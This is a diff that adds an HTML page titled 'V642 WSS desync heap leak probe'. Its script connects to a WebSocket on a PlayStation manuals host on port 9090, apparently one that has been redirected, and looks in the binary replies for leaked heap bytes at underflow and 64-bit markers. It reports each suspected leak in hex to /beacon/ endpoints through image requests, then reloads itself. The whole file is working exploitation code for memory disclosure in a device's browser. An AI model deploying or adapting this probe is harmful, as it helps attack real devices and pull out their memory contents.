@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V642</title></head>
+<body><pre id="out">V642 — WSS desync heap leak probe (TLS)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<80;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++]||(new Image());
+  img.src='/beacon/V642-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+function bytes2hex(arr,off,len){
+  var h='';off=off||0;len=Math.min(len||64,arr.length-off);
+  for(var i=off;i<off+len;i++) h+=('0'+arr[i].toString(16)).slice(-2);
+  return h;
+}
+
+bk('BOOT','v642-wss-desync');
+
+var ws;
+var msgs=0, leaks=0;
+try {
+  ws = new WebSocket('wss://manuals.playstation.net:9090/probe-leak');
+  ws.binaryType = 'arraybuffer';
+  bk('WS-OPEN','connecting');
+  say('Connecting WSS...');
+
+  ws.onopen = function(){
+    bk('WS-CONN','connected');
+    say('WSS connected!');
+  };
+
+  ws.onmessage = function(ev){
+    msgs++;
+    if(typeof ev.data === 'string'){
+      var txt = ev.data.slice(0,200);
+      say('TXT['+msgs+']: '+txt);
+      if(txt.indexOf('PROBES-COMPLETE')===0){
+        bk('WS-DONE','msgs='+msgs+',leaks='+leaks);
+        say('PROBES DONE — msgs='+msgs+' leaks='+leaks);
+      } else if(txt.indexOf('POST-UNDERFLOW')===0){
+        bk('WS-MARKER','P9-marker-received');
+      } else if(txt.indexOf('POST-64BIT')===0){
+        bk('WS-MARKER','P10-marker-received');
+      } else {
+        bk('WS-TXT','m='+msgs+',t='+txt.slice(0,100));
+      }
+    } else if(ev.data instanceof ArrayBuffer){
+      var ab = ev.data;
+      var view = new Uint8Array(ab);
+      var unk=0, firstUnk=-1, unkBytes='';
+      for(var i=0;i<view.length;i++){
+        var b=view[i];
+        if(b!==0x00 && b!==0xBB && b!==0xCC && b!==0xDD && b!==0xEE
+           && b!==0x00 && !(b>=0x4f && b<=0x60)){
+          if(unk<32) unkBytes+=('0'+b.toString(16)).slice(-2);
+          unk++;
+          if(firstUnk<0) firstUnk=i;
+        }
+      }
+      var hex16=bytes2hex(view,0,16);
+      say('BIN['+msgs+']: len='+ab.byteLength+' unk='+unk+' h='+hex16);
+      bk('WS-BIN','m='+msgs+',len='+ab.byteLength+',unk='+unk+',h16='+hex16);
+
+      if(ab.byteLength>50 && view[0]===0xBB){
+        var extra=ab.byteLength-50;
+        if(extra>0){
+          bk('P9-EXTRA','extra='+extra+',hex='+bytes2hex(view,50,Math.min(extra,64)));
+          leaks++;
+        }
+      }
+      if(ab.byteLength>32 && view[0]===0xCC){
+        var extra2=ab.byteLength-32;
+        if(extra2>0){
+          bk('P10-EXTRA','extra='+extra2+',hex='+bytes2hex(view,32,Math.min(extra2,64)));
+          leaks++;
+        }
+      }
+      if(unk>0 && firstUnk>=0){
+        bk('WS-LEAK','m='+msgs+',unk='+unk+',off='+firstUnk+',bytes='+unkBytes.slice(0,128));
+        leaks++;
+      }
+    }
+  };
+
+  ws.onerror = function(e){
+    bk('WS-ERR','error');
+    say('WS ERROR');
+  };
+
+  ws.onclose = function(ev){
+    bk('WS-CLOSE','code='+ev.code+',msgs='+msgs+',leaks='+leaks);
+    say('WS CLOSED code='+ev.code+' msgs='+msgs+' leaks='+leaks);
+  };
+} catch(e){
+  bk('WS-FAIL',e.name+':'+e.message.slice(0,100));
+  say('WS FAIL: '+e.message);
+}
+
+setTimeout(function(){
+  bk('TIMEOUT','msgs='+msgs+',leaks='+leaks);
+  say('TIMEOUT — reloading');
+  setTimeout(function(){ location.reload(); }, 2000);
+}, 25000);
+</script>
+</body></html>
